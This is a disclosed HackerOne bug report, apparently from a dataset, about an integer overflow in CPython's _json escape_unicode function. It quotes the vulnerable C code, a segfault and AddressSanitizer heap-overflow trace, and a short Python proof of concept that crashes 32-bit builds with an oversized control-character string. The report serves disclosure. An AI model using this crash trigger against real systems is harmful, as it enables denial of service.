---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '73260'
original_report_id: '73260'
title: Integer overflow in _json_encode_unicode leads to crash
team_handle: ibb
created_at: '2015-06-27T00:00:00.000Z'
disclosed_at: '2015-06-27T00:00:00.000Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
asset_identifier: Python (Legacy)
asset_type: OTHER
max_severity: none
tags:
- hackerone
---

# Integer overflow in _json_encode_unicode leads to crash

## Metadata

- HackerOne Report ID: 73260
- Weakness: 
- Program: ibb
- Disclosed At: 2015-06-27T00:00:00.000Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

http://bugs.python.org/issue24522

```
# static PyObject *
# escape_unicode(PyObject *pystr)
# {
#     /* Take a PyUnicode pystr and return a new escaped PyUnicode */
#     Py_ssize_t i;
#     Py_ssize_t input_chars;
#     Py_ssize_t output_size;
#     Py_ssize_t chars;
#     PyObject *rval;
#     void *input;
#     int kind;
#     Py_UCS4 maxchar;
# 
#     if (PyUnicode_READY(pystr) == -1)
#         return NULL;
# 
#     maxchar = PyUnicode_MAX_CHAR_VALUE(pystr);
#     input_chars = PyUnicode_GET_LENGTH(pystr);
#     input = PyUnicode_DATA(pystr);
#     kind = PyUnicode_KIND(pystr);
# 
#     /* Compute the output size */
#     for (i = 0, output_size = 2; i < input_chars; i++) {
#         Py_UCS4 c = PyUnicode_READ(kind, input, i);
#         switch (c) {
#         case '\\': case '"': case '\b': case '\f':
#         case '\n': case '\r': case '\t':
#             output_size += 2;
#             break;
#         default:
#             if (c <= 0x1f)
#                 output_size += 6;
#             else
#                 output_size++;
#         }
#     }
#
#     rval = PyUnicode_New(output_size, maxchar);
#
# 1.) if c is <= 0x1f then output_size += 6. There are no overflow checks on this variable.
# 2.) rval buffer is too small to hold results
#
# Crash:
# ------
#
# Program received signal SIGSEGV, Segmentation fault.
# 0xb7a2e9be in escape_unicode (pystr=pystr@entry=0x8cf81018)
#     at /home/pail/cpython/Modules/_json.c:306
# 306                ENCODE_OUTPUT;
#
# OS info
# --------
#  %./python -V
#  > Python 3.6.0a0
# % uname -a
# Linux Pail0verflow 3.13.0-52-generic #85-Ubuntu SMP Wed Apr 29 16:44:56 UTC 2015 i686 i686 i686 GNU/Linux
#
# ASAN Info (details in other file)
# =================================================================
# ==6512== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00000 at pc 0xb5f17356 bp 0xbfaa0eb8 sp 0xbfaa0eac
# WRITE of size 1 at 0xb5c00000 thread T0
```

import json

sp = "\x13"*715827883 #((2**32)/6 + 1)
json.dumps([sp], ensure_ascii=False)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
